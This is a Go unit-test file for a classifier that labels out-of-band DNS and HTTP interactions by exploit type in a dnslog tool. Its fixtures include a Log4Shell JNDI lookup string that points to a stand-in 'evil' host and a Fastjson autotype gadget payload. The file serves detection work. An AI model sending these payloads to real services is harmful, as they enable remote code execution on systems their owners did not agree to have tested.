package classifier

import (
	"testing"

	"github.com/chennqqi/godnslog/internal/models"
)

func TestClassifyLog4ShellDNS(t *testing.T) {
	domain := "${jndi:ldap://evil.test123.dnslog.fun}"
	interaction := &models.Interaction{
		Type:   "dns",
		Domain: &domain,
	}

	result := Classify(interaction)
	if result == nil {
		t.Fatal("expected classification, got nil")
	}
	if result.ExploitType != ExploitLog4shell {
		t.Errorf("expected exploit_type=%q, got %q", ExploitLog4shell, result.ExploitType)
	}
	if result.Confidence != ConfidenceHigh {
		t.Errorf("expected confidence=%q, got %q", ConfidenceHigh, result.Confidence)
	}
	if result.RuleID != "log4shell-jndi-dns" {
		t.Errorf("expected rule_id=log4shell-jndi-dns, got %q", result.RuleID)
	}
}

func TestClassifyXXE(t *testing.T) {
	path := "/xxe"
	interaction := &models.Interaction{
		Type: "http",
		Path: &path,
	}

	result := Classify(interaction)
	if result == nil {
		t.Fatal("expected classification, got nil")
	}
	if result.ExploitType != ExploitXXE {
		t.Errorf("expected exploit_type=%q, got %q", ExploitXXE, result.ExploitType)
	}
	if result.Confidence != ConfidenceHigh {
		t.Errorf("expected confidence=%q, got %q", ConfidenceHigh, result.Confidence)
	}
}

func TestClassifyFastjson(t *testing.T) {
	body := `{"@type":"com.sun.rowset.JdbcRowSetImpl"}`
	interaction := &models.Interaction{
		Type: "http",
		Body: &body,
	}

	result := Classify(interaction)
	if result == nil {
		t.Fatal("expected classification, got nil")
	}
	if result.ExploitType != ExploitFastjson {
		t.Errorf("expected exploit_type=%q, got %q", ExploitFastjson, result.ExploitType)
	}
	if result.Confidence != ConfidenceHigh {
		t.Errorf("expected confidence=%q, got %q", ConfidenceHigh, result.Confidence)
	}
}

func TestClassifyNoMatch(t *testing.T) {
	domain := "www.google.com"
	interaction := &models.Interaction{
		Type:   "dns",
		Domain: &domain,
	}

	result := Classify(interaction)
	if result != nil {
		t.Errorf("expected nil, got %+v", result)
	}
}

func TestClassifyAll(t *testing.T) {
	domain := "jndi.xxe.test.dnslog.fun"
	path := "/xxe"
	interaction := &models.Interaction{
		Type:   "dns",
		Domain: &domain,
		Path:   &path,
	}

	results := ClassifyAll(interaction)
	if len(results) == 0 {
		t.Fatal("expected at least one classification")
	}

	foundXXE := false
	for _, r := range results {
		if r.ExploitType == ExploitXXE {
			foundXXE = true
			break
		}
	}
	if !foundXXE {
		t.Error("expected XXE classification in results")
	}

	if len(results) < 2 {
		t.Errorf("expected multiple results, got %d", len(results))
	}

	// Verify results are ordered by priority (high first, then medium, then low)
	priorityOrder := map[string]int{"high": 0, "medium": 1, "low": 2}
	for i := 1; i < len(results); i++ {
		if priorityOrder[results[i-1].Confidence] > priorityOrder[results[i].Confidence] {
			t.Errorf("results not in priority order: %s (prio=%d) before %s (prio=%d)",
				results[i-1].RuleID, priorityOrder[results[i-1].Confidence],
				results[i].RuleID, priorityOrder[results[i].Confidence])
		}
	}
}

func TestClassifySqlInject(t *testing.T) {
	path := "/search?query=test"
	interaction := &models.Interaction{
		Type: "http",
		Path: &path,
	}

	result := Classify(interaction)
	if result == nil {
		t.Fatal("expected classification, got nil")
	}
	if result.ExploitType != ExploitSQLi {
		t.Errorf("expected exploit_type=%q, got %q", ExploitSQLi, result.ExploitType)
	}
}

func TestClassifyEmptyInteraction(t *testing.T) {
	interaction := &models.Interaction{}

	result := Classify(interaction)
	if result != nil {
		t.Errorf("expected nil for empty interaction, got %+v", result)
	}
}
